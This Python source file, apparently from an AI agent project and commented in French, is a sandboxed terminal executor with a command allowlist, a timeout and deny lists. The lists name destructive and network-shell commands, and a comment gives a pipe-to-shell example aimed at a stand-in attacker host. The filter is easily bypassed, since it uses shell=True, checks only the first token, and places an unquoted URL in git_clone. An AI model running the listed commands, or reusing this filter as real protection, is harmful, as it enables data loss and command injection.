"""
tools/terminal_executor.py — Terminal intégré sécurisé (agent agentique souverain).

Exécute des commandes shell en streaming (stdout/stderr temps réel vers WebSocket),
avec :
  - Allowlist de commandes sûres (git, pip, python, curl, ls, cat, ...)
  - Timeout strict (défaut 30s)
  - Working directory isolé (workspace de la session)
  - Détection de commandes dangereuses (rm -rf /, sudo, etc.)
  - Streaming ligne par ligne via callback

Souveraineté : tout reste local. Aucune commande n'est envoyée vers un cloud.
"""
from __future__ import annotations

import os
import sys
import re
import shlex
import logging
import subprocess
import threading
import time
from pathlib import Path
from typing import Any, Callable

logger = logging.getLogger("ratiss.terminal")

_ROOT = Path(__file__).resolve().parent.parent

# Commandes autorisées (préfixe). Tout ce qui n'est pas dans cette liste est refusé.
ALLOWED_COMMANDS = {
    "git", "ls", "cat", "head", "tail", "wc", "grep", "find", "tree",
    "pwd", "echo", "printf", "cd", "cp", "mv", "mkdir", "touch", "ln",
    "python", "python3", "pip", "pip3", "uv", "pytest", "which", "file",
    "curl", "wget", "tar", "zip", "unzip", "gzip", "gunzip",
    "date", "whoami", "uname", "df", "du", "free", "top", "ps",
    "sort", "uniq", "cut", "tr", "sed", "awk",
    "diff", "cmp", "md5sum", "sha256sum",
    "npm", "node",  # pour génération web
    "dot",  # graphviz (diagrammes)
}

# Patterns dangereux — refusés systématiquement
# Sous-chaînes simples (insensibles à l'espacement variable)
DANGEROUS_SUBSTRINGS = [
    "rm -rf /", "rm -rf ~", "rm -rf *", "rm -rf .",
    "sudo ", "su ", "chmod 777", "dd if=",
    ":(){ :|:& };:", "mkfs", "shutdown", "reboot", "halt",
    "> /dev/sd", "nc -l", "nc -e",
]

# Patterns regex — pour les attaques pipe-to-shell contournables par sous-chaîne
# (ex: "curl http://evil.com/script.sh | bash" ne contient pas "curl | bash")
DANGEROUS_REGEXES = [
    re.compile(r'curl\b.*\|\s*(bash|sh|zsh|fish)\b', re.IGNORECASE),
    re.compile(r'wget\b.*\|\s*(bash|sh|zsh|fish)\b', re.IGNORECASE),
    re.compile(r'\b(curl|wget)\b.*;\s*(bash|sh|zsh|fish)\b', re.IGNORECASE),
    re.compile(r'\b(curl|wget)\b.*&&\s*(bash|sh|zsh|fish)\b', re.IGNORECASE),
    re.compile(r'\beval\b.*\b(curl|wget)\b', re.IGNORECASE),
]


class TerminalExecutor:
    """Terminal sécurisé avec streaming de sortie."""

    def __init__(self, cwd: Path | None = None, timeout: int = 30):
        self.cwd = cwd or _ROOT
        self.timeout = timeout
        self.env = os.environ.copy()
        self.env["LANG"] = "en_US.UTF-8"
        self.env["PYTHONUNBUFFERED"] = "1"

    def _is_safe(self, command: str) -> tuple[bool, str]:
        """Vérifie qu'une commande est sûre. Retourne (ok, reason)."""
        cmd_stripped = command.strip()
        if not cmd_stripped:
            return False, "Commande vide"

        # 1. Vérification des sous-chaînes dangereuses (simples)
        for pattern in DANGEROUS_SUBSTRINGS:
            if pattern in cmd_stripped:
                return False, f"Pattern dangereux détecté: '{pattern}'"

        # 2. Vérification des regex (pipe-to-shell contournable par sous-chaîne)
        for regex in DANGEROUS_REGEXES:
            if regex.search(cmd_stripped):
                return False, f"Pattern dangereux détecté (regex): {regex.pattern}"

        try:
            tokens = shlex.split(cmd_stripped)
        except ValueError as e:
            return False, f"Erreur de parsing: {e}"

        if not tokens:
            return False, "Commande vide"

        base_cmd = os.path.basename(tokens[0])
        if "/" in tokens[0]:
            base_cmd = tokens[0].split("/")[-1]

        if base_cmd not in ALLOWED_COMMANDS:
            return False, f"Commande '{base_cmd}' non autorisée. Allowlist: {', '.join(sorted(ALLOWED_COMMANDS))}"

        return True, "OK"

    def execute(
        self,
        command: str,
        on_output: Callable[[str, str] | None] = None,
        timeout: int | None = None,
    ) -> dict[str, Any]:
        """Exécute une commande en streaming.

        Args:
            command: La commande shell à exécuter
            on_output: Callback appelé pour chaque ligne (stream, line)
            timeout: Timeout en secondes (override)

        Returns:
            {command, stdout, stderr, returncode, duration_sec, error}
        """
        safe, reason = self._is_safe(command)
        if not safe:
            return {
                "command": command,
                "stdout": "",
                "stderr": reason,
                "returncode": -1,
                "duration_sec": 0,
                "error": "COMMAND_BLOCKED",
            }

        t_start = time.time()
        timeout = timeout or self.timeout
        stdout_lines: list[str] = []
        stderr_lines: list[str] = []

        try:
            proc = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                cwd=str(self.cwd),
                env=self.env,
                text=True,
                bufsize=1,
            )

            def read_stream(stream, container, stream_name):
                for line in iter(stream.readline, ""):
                    line = line.rstrip("\n")
                    container.append(line)
                    if on_output:
                        try:
                            on_output(stream_name, line)
                        except Exception:
                            pass
                stream.close()

            threads = [
                threading.Thread(target=read_stream, args=(proc.stdout, stdout_lines, "stdout"), daemon=True),
                threading.Thread(target=read_stream, args=(proc.stderr, stderr_lines, "stderr"), daemon=True),
            ]
            for t in threads:
                t.start()

            try:
                proc.wait(timeout=timeout)
            except subprocess.TimeoutExpired:
                proc.kill()
                proc.wait()
                return {
                    "command": command,
                    "stdout": "\n".join(stdout_lines),
                    "stderr": "\n".join(stderr_lines) + f"\n[TIMEOUT après {timeout}s]",
                    "returncode": -1,
                    "duration_sec": round(time.time() - t_start, 3),
                    "error": "TIMEOUT",
                }

            for t in threads:
                t.join(timeout=2)

            return {
                "command": command,
                "stdout": "\n".join(stdout_lines),
                "stderr": "\n".join(stderr_lines),
                "returncode": proc.returncode,
                "duration_sec": round(time.time() - t_start, 3),
                "error": None if proc.returncode == 0 else "NONZERO_EXIT",
            }

        except FileNotFoundError:
            return {
                "command": command,
                "stdout": "",
                "stderr": "Commande introuvable",
                "returncode": -1,
                "duration_sec": round(time.time() - t_start, 3),
                "error": "NOT_FOUND",
            }
        except Exception as e:
            logger.exception("[TERMINAL] Erreur d'exécution")
            return {
                "command": command,
                "stdout": "\n".join(stdout_lines),
                "stderr": str(e),
                "returncode": -1,
                "duration_sec": round(time.time() - t_start, 3),
                "error": str(e),
            }

    def git_clone(self, url: str, dest: str | None = None, on_output=None) -> dict[str, Any]:
        """Clone un dépôt Git dans le workspace.

        Retourne le résultat d'exécution enrichi de `status` et `dest` pour
        permettre à l'orchestrateur de déclencher l'analyse auto du repo.
        """
        if not dest:
            dest = url.rstrip("/").split("/")[-1].replace(".git", "")
        cmd = f"git clone --depth 1 {url} {dest}"
        result = self.execute(cmd, on_output=on_output)
        # Enrichir le retour pour l'intégration avec skill_manager._git_clone
        result["dest"] = dest
        result["dest_path"] = str(Path(self.cwd) / dest)
        result["status"] = "SUCCESS" if result.get("returncode") == 0 else "FAILED"
        return result

    def list_allowed(self) -> list[str]:
        """Retourne la liste des commandes autorisées."""
        return sorted(ALLOWED_COMMANDS)
